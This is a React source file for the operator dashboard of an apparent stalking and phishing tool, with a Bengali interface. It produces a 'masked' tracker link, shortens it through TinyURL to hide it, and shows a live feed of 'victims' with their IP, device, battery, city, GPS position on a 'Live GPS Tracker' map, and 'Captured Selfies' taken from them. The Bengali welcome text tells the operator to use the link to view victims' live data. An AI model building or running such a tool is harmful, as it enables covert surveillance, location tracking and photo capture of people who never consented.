
import React, { useState, useEffect } from 'react';
import { User, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { collection, query, where, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { auth, db } from '../firebase';

interface LogEntry {
  id: string;
  timestamp: any;
  device?: { name: string; model: string; userAgent: string; };
  battery?: { level: number; charging: boolean };
  location?: { lat: number; lng: number; accuracy: number };
  photoUrls?: string[];
  ip?: string;
  city?: string;
  status?: string;
}

const Dashboard: React.FC<{ user: User }> = ({ user }) => {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [copySuccess, setCopySuccess] = useState(false);
  const [shortUrl, setShortUrl] = useState('');
  const [shortening, setShortening] = useState(false);
  const [viewMap, setViewMap] = useState<{lat: number, lng: number} | null>(null);
  const [viewPhotos, setViewPhotos] = useState<string[] | null>(null);
  
  const baseUrl = window.location.origin + window.location.pathname;
  const trackerLink = `${baseUrl}#/trk/${user.uid}`;

  useEffect(() => {
    // Real-time listener for logs where userId matches admin uid
    const q = query(collection(db, "logs"), where("userId", "==", user.uid));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })) as LogEntry[];
      // Newest logs at top
      data.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
      setLogs(data);
      setLoading(false);
    }, (error) => {
      console.error("Firestore Listener Error:", error);
    });
    return () => unsubscribe();
  }, [user.uid]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 2000);
  };

  const generateTinyUrl = async () => {
    setShortening(true);
    try {
      const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(trackerLink)}`);
      if (response.ok) setShortUrl(await response.text());
    } catch (e) { alert("TinyURL API failed"); }
    setShortening(false);
  };

  return (
    <div className="min-h-screen bg-[#F1F5F9] font-['Hind_Siliguri']">
      <nav className="bg-white/80 backdrop-blur-md border-b border-slate-200 px-6 py-4 flex justify-between items-center sticky top-0 z-40">
        <div className="flex items-center gap-3">
           <div className="w-9 h-9 bg-blue-600 rounded-xl flex items-center justify-center shadow-lg shadow-blue-200">
              <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
           </div>
           <h1 className="text-lg font-black text-slate-800">অ্যাডমিন ড্যাশবোর্ড</h1>
        </div>
        <button onClick={() => signOut(auth)} className="bg-red-50 text-red-600 px-5 py-2 rounded-xl text-xs font-black hover:bg-red-100 transition-colors">লগ আউট</button>
      </nav>

      <main className="max-w-4xl mx-auto p-4 md:p-8 space-y-6">
        {/* Statistics */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
           <div className="md:col-span-2 bg-slate-900 p-8 rounded-[32px] text-white shadow-2xl relative overflow-hidden">
              <div className="absolute top-0 right-0 p-8 opacity-10">
                 <svg className="w-32 h-32" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
              </div>
              <h2 className="text-2xl font-black">স্বাগতম, {user.displayName?.split(' ')[0] || 'ইউজার'}!</h2>
              <p className="text-slate-400 text-sm mt-2 font-medium">আপনার ট্র্যাকার লিংক ব্যবহার করে ভিক্টিমদের লাইভ তথ্য দেখুন।</p>
           </div>
           <div className="bg-white p-8 rounded-[32px] border border-slate-200 shadow-sm flex flex-col items-center justify-center text-center">
              <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest mb-1">Total Victims</p>
              <h3 className="text-6xl font-black text-blue-600 tabular-nums">{logs.length}</h3>
           </div>
        </div>

        {/* Link Management */}
        <div className="bg-white p-8 rounded-[32px] border border-slate-200 shadow-sm space-y-5">
           <div className="flex items-center gap-2">
              <div className="w-2 h-2 bg-blue-600 rounded-full animate-ping"></div>
              <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest">আপনার মাস্কড লিংক</p>
           </div>
           <div className="flex flex-col md:flex-row gap-3">
              <input readOnly value={shortUrl || trackerLink} className="flex-1 bg-slate-50 border border-slate-200 px-5 py-3.5 rounded-2xl text-[11px] font-mono text-blue-700 outline-none" />
              <div className="flex gap-2">
                <button onClick={() => copyToClipboard(shortUrl || trackerLink)} className="flex-1 md:flex-none bg-slate-900 text-white px-8 rounded-2xl text-xs font-black hover:bg-black transition-all active:scale-95">
                  {copySuccess ? 'কপি হয়েছে' : 'কপি'}
                </button>
                {!shortUrl && (
                  <button onClick={generateTinyUrl} disabled={shortening} className="flex-1 md:flex-none bg-blue-600 text-white px-6 py-3.5 rounded-2xl font-black text-xs shadow-lg shadow-blue-100 transition-all hover:bg-blue-700 disabled:opacity-50">
                    {shortening ? 'লোডিং...' : 'TinyURL জেনারেট'}
                  </button>
                )}
              </div>
           </div>
        </div>

        {/* Victim Logs */}
        <div className="space-y-4">
           <h3 className="text-md font-black text-slate-700 px-2 flex items-center gap-2">
             লাইভ রিপোর্টস
             <span className="bg-green-100 text-green-600 text-[10px] px-2 py-0.5 rounded-full">Active Now</span>
           </h3>

           <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {logs.map((log, index) => {
                const victimId = logs.length - index;
                return (
                  <div key={log.id} className="bg-white p-6 rounded-[30px] border border-slate-200 shadow-sm hover:border-blue-400 transition-all group relative overflow-hidden">
                     <div className="absolute top-4 right-6 bg-blue-50 text-blue-600 px-3 py-1 rounded-full text-[9px] font-black uppercase">
                       Victim #{victimId}
                     </div>
                     
                     <div className="space-y-4">
                        <div>
                           <p className="text-[9px] font-black text-slate-400 uppercase mb-1">Device & IP</p>
                           <p className="text-xs font-bold text-slate-800 flex items-center gap-1.5">
                             <span className="truncate max-w-[120px]">{log.device?.name || 'Unknown'}</span>
                             <span className="text-blue-500 font-mono text-[10px]">{log.ip}</span>
                           </p>
                        </div>

                        <div className="grid grid-cols-2 gap-2">
                           <div className="bg-slate-50 p-3 rounded-2xl border border-slate-100">
                              <p className="text-[8px] text-slate-400 font-black uppercase mb-0.5">Battery</p>
                              <p className="text-xs font-black text-slate-700">{log.battery ? `${log.battery.level}%` : 'N/A'}</p>
                           </div>
                           <div className="bg-slate-50 p-3 rounded-2xl border border-slate-100">
                              <p className="text-[8px] text-slate-400 font-black uppercase mb-0.5">City</p>
                              <p className="text-[10px] font-black text-slate-700 truncate">{log.city || 'Unknown'}</p>
                           </div>
                        </div>

                        <div className="flex gap-2 pt-1">
                           <button 
                             onClick={() => setViewPhotos(log.photoUrls || [])}
                             className="flex-1 bg-slate-900 text-white py-3 rounded-xl text-[10px] font-black flex items-center justify-center gap-2"
                           >
                             Selfie ({log.photoUrls?.length || 0})
                           </button>
                           {log.location && (
                             <button 
                               onClick={() => setViewMap(log.location || null)}
                               className="flex-1 bg-blue-600 text-white py-3 rounded-xl text-[10px] font-black flex items-center justify-center gap-2 shadow-md shadow-blue-50"
                             >
                               Live Map
                             </button>
                           )}
                        </div>
                        
                        <p className="text-[9px] text-slate-300 font-mono text-center pt-2 border-t border-slate-50">
                          {log.timestamp?.toDate().toLocaleString('bn-BD')}
                        </p>
                     </div>
                  </div>
                );
              })}
           </div>
        </div>

        {/* Footer */}
        <footer className="pt-16 pb-10 text-center border-t border-slate-200">
           <div className="bg-white inline-flex items-center gap-4 px-6 py-3 rounded-2xl shadow-sm border border-slate-200">
              <div className="w-10 h-10 bg-blue-100 rounded-xl flex items-center justify-center text-blue-600">
                 <svg className="w-6 h-6" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
              </div>
              <div className="text-left">
                <p className="text-[8px] text-slate-400 font-black uppercase leading-none">Admin Console v8.0</p>
                <a href="https://www.facebook.com/profile.php?id=61569035777496" target="_blank" rel="noopener noreferrer" className="text-sm font-black text-slate-800 hover:text-blue-600 transition-colors">Arefin Foysal</a>
              </div>
           </div>
           <p className="text-[10px] text-slate-300 font-bold uppercase mt-8 tracking-[0.5em]">Developed with ❤️ in Bangladesh</p>
        </footer>
      </main>

      {/* Map Modal */}
      {viewMap && (
        <div className="fixed inset-0 z-[100] bg-slate-900/90 backdrop-blur-md flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-xl rounded-[32px] overflow-hidden shadow-2xl border border-white/20">
              <div className="p-6 border-b flex justify-between items-center bg-slate-50">
                 <h4 className="font-black text-slate-800">Live GPS Tracker</h4>
                 <button onClick={() => setViewMap(null)} className="w-9 h-9 bg-white shadow-sm rounded-full flex items-center justify-center text-slate-400 hover:text-red-500">✕</button>
              </div>
              <div className="aspect-video w-full">
                 <iframe 
                    width="100%" 
                    height="100%" 
                    frameBorder="0" 
                    src={`https://maps.google.com/maps?q=${viewMap.lat},${viewMap.lng}&z=17&output=embed`}
                 />
              </div>
              <div className="p-6 bg-slate-50 flex gap-3">
                 <a href={`https://www.google.com/maps?q=${viewMap.lat},${viewMap.lng}`} target="_blank" className="flex-1 bg-blue-600 text-white py-4 rounded-2xl font-black text-xs text-center shadow-lg shadow-blue-200">View on Google Maps</a>
                 <button onClick={() => setViewMap(null)} className="flex-1 bg-white border border-slate-200 text-slate-700 py-4 rounded-2xl font-black text-xs">Close Panel</button>
              </div>
           </div>
        </div>
      )}

      {/* Photo Modal */}
      {viewPhotos && (
        <div className="fixed inset-0 z-[100] bg-slate-900/95 backdrop-blur-xl flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-2xl rounded-[32px] overflow-hidden">
              <div className="p-6 border-b flex justify-between items-center">
                 <h4 className="font-black text-slate-800">Captured Selfies</h4>
                 <button onClick={() => setViewPhotos(null)} className="w-8 h-8 bg-slate-100 rounded-full flex items-center justify-center text-slate-500 hover:bg-slate-200 transition-colors">✕</button>
              </div>
              <div className="p-6 grid grid-cols-2 md:grid-cols-3 gap-3 overflow-y-auto max-h-[70vh] bg-slate-50">
                 {viewPhotos.map((url, i) => (
                   <img key={i} src={url} className="rounded-2xl border-4 border-white shadow-sm aspect-square object-cover" />
                 ))}
                 {viewPhotos.length === 0 && <div className="col-span-full py-20 text-center text-slate-400 font-bold">No selfies captured yet.</div>}
              </div>
              <div className="p-6 bg-white text-center">
                 <button onClick={() => setViewPhotos(null)} className="bg-slate-900 text-white px-10 py-4 rounded-2xl font-black text-xs">Close Gallery</button>
              </div>
           </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
